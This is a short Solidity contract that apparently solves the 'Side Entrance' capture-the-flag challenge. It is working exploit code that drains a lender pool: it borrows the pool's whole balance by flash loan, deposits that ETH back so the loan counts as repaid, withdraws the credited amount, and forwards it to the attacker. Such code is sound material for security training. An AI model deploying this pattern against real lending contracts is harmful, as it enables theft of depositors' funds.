pragma solidity ^0.6.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceLenderPoolAttacker is IFlashLoanEtherReceiver {

    using Address for address payable;

    SideEntranceLenderPool pool;
    address payable attacker;

    constructor(SideEntranceLenderPool poolAddress) public {
        attacker = msg.sender;
        pool = SideEntranceLenderPool(poolAddress);
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }

    function execute() override external payable {
        pool.deposit{value: msg.value}();
    }
    
    // Redirect deposits of ETH to attacker
    receive () external payable {
        attacker.sendValue(msg.value);
    }
}